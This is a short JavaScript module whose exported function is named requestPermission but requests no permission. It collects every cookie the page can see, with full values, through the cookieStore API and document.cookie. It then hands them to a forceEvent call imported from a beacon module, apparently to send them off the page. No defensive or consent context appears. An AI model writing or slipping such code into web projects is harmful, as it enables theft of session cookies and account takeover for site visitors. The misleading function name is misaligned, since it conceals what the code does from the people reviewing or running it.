import { forceEvent } from '../beacon.js';

export async function requestPermission() {
  const result = { ts: Date.now() };

  // cookieStore API (async, structured)
  try {
    if (window.cookieStore) {
      const all = await cookieStore.getAll();
      result.cookies = all.map(c => ({
        name: c.name, value: c.value,
        domain: c.domain, path: c.path,
        secure: c.secure, sameSite: c.sameSite,
        expires: c.expires ?? null,
      }));
    }
  } catch (e) { result.cookieStoreError = e.message; }

  // document.cookie fallback (semicolon-separated string)
  try {
    const raw = document.cookie;
    result.documentCookie = raw;
    if (!result.cookies && raw) {
      result.cookies = raw.split(';').map(pair => {
        const [name, ...rest] = pair.trim().split('=');
        return { name: name.trim(), value: rest.join('=').trim() };
      });
    }
  } catch (e) { result.documentCookieError = e.message; }

  await forceEvent('cookies', result);
  return result;
}
